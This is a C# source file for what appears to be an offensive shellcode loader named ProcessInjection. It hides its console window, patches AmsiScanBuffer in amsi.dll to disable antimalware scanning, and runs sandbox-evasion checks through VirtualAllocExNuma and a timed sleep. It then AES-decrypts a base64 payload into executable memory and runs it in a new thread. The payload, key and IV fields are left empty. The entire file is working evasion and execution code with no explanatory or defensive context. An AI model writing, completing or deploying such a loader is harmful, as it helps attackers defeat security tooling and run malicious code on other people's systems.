using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace ProcessInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
        public static void AmsiPatch()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            if (TargetDLL == IntPtr.Zero)
            {
                return;
            }

            IntPtr AmsiScanBufrPtr = GetProcAddress(TargetDLL, "AmsiScanBuffer");
            if (AmsiScanBufrPtr == IntPtr.Zero)
            {
                return;
            }

            UIntPtr dwSize = (UIntPtr)4;
            uint Zero = 0;
            if (!VirtualProtect(AmsiScanBufrPtr, dwSize, 0x40, out Zero))
            {
                return;
            }

            Byte[] Patch = { 0x31, 0xff, 0x90 };    
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(AmsiScanBufrPtr + 0x001b, unmanagedPointer, 3);            

            return;
        }

        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), 0);
            AmsiPatch();

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            string finalPayload = "";
            byte[] key = new byte[] {  };
            byte[] iv = new byte[] {  };
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(decrypted_data, 0, addr, decrypted_data.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
